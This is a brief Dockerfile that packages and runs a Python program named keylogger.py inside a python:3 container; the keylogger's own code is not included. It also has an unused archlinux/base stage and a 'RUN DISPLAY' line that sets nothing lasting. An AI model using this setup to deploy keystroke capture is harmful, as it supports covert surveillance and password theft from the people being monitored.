FROM archlinux/base

FROM python:3

ADD keylogger.py /
ADD requirements.txt /

RUN pip install -r requirements.txt
RUN DISPLAY=":0"

CMD ["python", "keylogger.py"]
